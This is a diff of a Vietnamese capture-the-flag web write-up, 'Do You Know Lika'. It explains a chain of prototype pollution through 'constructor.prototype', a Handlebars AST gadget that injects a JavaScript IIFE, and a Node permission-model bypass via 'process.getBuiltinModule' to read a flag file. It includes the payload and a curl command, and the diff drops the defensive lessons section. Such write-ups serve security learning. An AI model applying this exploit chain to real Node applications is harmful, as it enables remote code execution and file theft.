@@ -10,30 +10,21 @@ tags:
   - RCE
 ---
 
-# Do You Know Lika — Write-up
+## Solution
 
-**Thể loại:** Web · **Kỹ thuật:** Prototype Pollution → Handlebars AST gadget → RCE trong worker
+Server nhận JSON cấu hình postcard rồi gộp vào object bằng hàm đệ quy `mergeTheme` trong `worker.js`. Đọc kỹ hàm này thấy nó ghi đệ quy vào target mà không check `hasOwnProperty`, nên với `theme.constructor.prototype.X = ...` thì key `X` được gán thẳng vào `Object.prototype`.
 
-## Tóm tắt
+Bộ lọc ở `server.js` (`validateJob`) chỉ chặn key `__proto__`, không chặn `constructor.prototype`, nên con đường ô nhiễm prototype này lọt qua thoải mái.
 
-Server nhận JSON cấu hình postcard, gộp vào object bằng hàm đệ quy `mergeTheme`. Bộ lọc chỉ chặn key `__proto__`, nhưng không chặn `constructor.prototype`. Nhờ đó ta làm ô nhiễm `Object.prototype`. Sau đó Handlebars compile một AST do ta nhúng vào, và phần `NumberLiteral` được chèn thẳng thành code JS chạy trong worker. Worker có Node permission model nhưng vẫn đọc được file qua `process.getBuiltinModule("fs")`.
+Có prototype pollution rồi thì cần một gadget để kéo ra RCE. Handlebars ngay trong `Handlebars.compile(job.template, {preventIndent: true})` đọc các thuộc tính AST từ prototype, nên ta đặt một `Program` có `MustacheStatement` với `NumberLiteral`, value là một IIFE đọc file:
 
-## Các bước
+```js!
+(()=>{throw new Error(process.getBuiltinModule("fs").readFileSync("/tmp/lika/flag.txt","utf8"))})()
+```
 
-1. **Lỗ hổng gộp object** (`worker.js`): `mergeTheme` ghi đệ quy vào target. Với `theme.constructor.prototype.X = ...`, key `X` được gán vào `Object.prototype`.
-2. **Bộ lọc không đầy đủ** (`server.js`, `validateJob`): chỉ chặn `__proto__`, nên `constructor.prototype` lọt qua.
-3. **Gadget Handlebars**: `Handlebars.compile(job.template, {preventIndent: true})` đọc các thuộc tính AST từ prototype. Ta đặt một `Program` có `MustacheStatement` với `NumberLiteral`, value là một IIFE:
+Khi Handlebars compile, IIFE này được chèn thẳng vào code sinh ra và chạy luôn. Payload gửi lên:
 
-   ```js
-   (()=>{throw new Error(process.getBuiltinModule("fs").readFileSync("/tmp/lika/flag.txt","utf8"))})()
-   ```
-
-   Khi compile, IIFE này được chèn vào code đã sinh và chạy.
-4. **Lấy kết quả**: `/api/preview` trả về 422 khi worker báo `ok:false`, và nội dung lỗi chứa nội dung file flag.
-
-Payload:
-
-```json
+```json!
 {
   "template": "x",
   "theme": {
@@ -56,20 +47,12 @@ Payload:
 }
 ```
 
-Gửi bằng:
-
-```sh
+```sh!
 curl -s -X POST "$URL/api/preview" -H 'Content-Type: application/json' --data-binary @payload.json
 ```
 
-Đã kiểm chứng trên bản sao local (đổi đường dẫn flag sang file giả): lỗi trả về đúng nội dung file.
+`/api/preview` trả 422 khi worker báo `ok:false`, nhưng nội dung lỗi lại chứa đúng nội dung file flag — worker throw Error với nội dung file đọc được, và lỗi đó bị dội ngược lên response.
 
-## Vì sao cần `process.getBuiltinModule`
+Một chi tiết đáng chú ý: worker chạy với `--permission --allow-fs-read=...`, nên `require('fs')`/`import fs` bị Node chặn thẳng. Nhưng `process.getBuiltinModule` ở bản Node này trả về module `fs` mà không đi qua permission check, nên đọc được `/tmp/lika/flag.txt` dù sandbox tưởng đã chặn hết đường vào fs.
 
-Worker khởi động với `--permission --allow-fs-read=...`. Khi chạy `require('fs')` hay `import fs` thì bị từ chối. Nhưng `process.getBuiltinModule` trong phiên bản Node này trả về module `fs` mà không đi qua kiểm tra permission, nên đọc được `/tmp/lika/flag.txt`.
-
-## Bài học
-
-- Khi gộp object do người dùng cung cấp, phải chặn cả `__proto__`, `constructor` và `prototype`, hoặc dùng `Object.create(null)` / kiểm tra `hasOwnProperty`.
-- Sandbox dựa vào permission flag không đủ nếu còn API cho phép lấy module tích hợp sẵn.
-- Các engine template (Handlebars, EJS, Pug...) có thể bị khai thác qua AST/options khi input không tin cậy được đưa vào compile.
+-> Flag: đọc được qua lỗi trả về của `/api/preview`.
